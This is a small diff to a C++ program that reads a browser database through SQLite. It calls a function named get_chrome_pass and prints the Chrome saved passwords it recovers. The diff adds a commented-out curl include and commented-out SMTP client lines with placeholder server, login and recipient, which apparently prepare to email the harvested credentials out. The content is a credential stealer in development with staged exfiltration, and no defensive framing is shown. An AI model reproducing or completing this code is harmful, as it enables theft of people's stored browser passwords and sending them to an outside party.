@@ -10,6 +10,7 @@
 #include <string>
 #include <sstream>
 #include "sqlite3.h"
+//#include <curl/curl.h>
 
 #ifdef _WIN32
     #include "windows/tools.h"
@@ -69,6 +70,9 @@ int main()
             }
             pass = get_chrome_pass(db);
             std::cout << pass.str();
+
+            //SMTPClient email("yoursmtpserver.com", 25, "user@yourdomain.com", "password");
+            //email.Send("from@yourdomain.com","to@somewhere.com","subject","Hello from C++ SMTP Client!");
 
             //rc = sqlite3_exec(db, sql.c_str(), callback1, 0, &zErrMsg);
         }
